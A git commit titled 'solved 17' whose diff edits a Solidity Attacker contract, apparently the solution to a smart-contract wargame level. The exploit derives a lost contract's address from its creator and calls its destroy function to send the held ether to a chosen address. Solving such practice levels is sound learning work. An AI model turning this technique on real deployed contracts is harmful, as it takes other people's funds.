34ceb184a1fddaeb818cc4c9896d01ba6b29bf4c
siyovush-hamidov <siyovushchik14@gmail.com>
2024-08-09 20:44:39 +0500

    solved 17

--- tests/test17.sol
+++ tests/test17.sol
@@ -5,10 +5,10 @@ import "src/level17.sol";
 
 contract Attacker
 {
-    function exploit() external 
+    function exploit(address creator_address, address send_to) external 
     {
-        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(0x882df2eAf842580a4C7c98F6D6Ff772094276c0C), bytes1(0x01)))))));
+        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(creator_address), bytes1(0x01)))))));
         SimpleToken level17 = SimpleToken(lostcontract);
-        level17.destroy(payable(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a));
+        level17.destroy(payable(send_to));
     }
 }
